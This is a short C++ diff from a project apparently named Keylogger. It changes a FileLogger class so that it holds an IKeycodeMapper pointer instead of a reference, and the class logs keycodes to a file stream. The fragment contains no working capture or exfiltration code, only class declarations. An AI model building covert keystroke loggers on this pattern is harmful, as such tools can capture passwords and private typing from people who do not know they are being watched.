@@ -9,13 +9,13 @@ namespace Keylogger {
 
 class FileLogger : public ILogger {
  public:
-    bool open(IKeycodeMapper &mapper, std::string filename);
+    bool open(IKeycodeMapper* mapper, std::string filename);
     void close();
 
     void logKeycode(int keycode, int state);
 
  private:
-    //IKeycodeMapper& _mapper;
+    IKeycodeMapper* _mapper;
     std::ofstream _stream;
 };
 
